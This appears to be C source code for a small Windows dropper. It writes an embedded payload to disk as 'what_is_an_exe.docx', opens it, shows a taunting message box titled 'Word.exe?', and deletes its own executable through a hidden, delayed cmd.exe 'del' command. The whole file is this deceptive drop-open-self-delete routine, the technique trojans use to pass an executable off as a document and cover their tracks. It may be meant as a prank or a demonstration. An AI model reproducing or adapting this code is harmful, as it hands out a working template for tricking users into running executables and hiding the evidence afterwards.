#define WINDOWS_LEAN_AND_MEAN
#include <payload.h>
#include <windows.h>
#include <shlwapi.h>
#include <intrin.h>
#include <stdlib.h>
#pragma warning(disable:4026)
#pragma intrinsic(__movsb)
#pragma intrinsic(__movsd)



const char f_nm[]="what_is_an_exe.docx";



int WinMain(void){
	char fp[MAX_PATH];
	char del_cmd[54+MAX_PATH]="cmd.exe /c ping 1.1.1.1 -n 1 -w 3000>nul&del /f /q \"";
	DWORD r=GetModuleFileNameA(NULL,fp,MAX_PATH);
	if (!r||r>MAX_PATH){
		return 1;
	}
	__movsb(del_cmd+52,fp,r);
	del_cmd[r+52]='\"';
	del_cmd[r+53]=0;
	while (fp[r]!='/'&&fp[r]!='\\'){
		r--;
	}
	__movsd((unsigned long*)(fp+r),(unsigned long*)f_nm,5);
	HANDLE f=CreateFileA(fp,GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if (f==INVALID_HANDLE_VALUE){
		return 1;
	}
	WriteFile(f,PAYLOAD,PAYLOAD_SIZE,&r,NULL);
	CloseHandle(f);
	ShellExecuteA(NULL,"open",fp,NULL,NULL,SW_SHOW);
	MessageBoxA(NULL,"How did this happen?","Word.exe?",MB_OK|MB_TOPMOST|MB_SYSTEMMODAL);
	STARTUPINFOA si={
		sizeof(STARTUPINFOA)
	};
	PROCESS_INFORMATION pi;
	CreateProcessA(NULL,del_cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return 0;
}
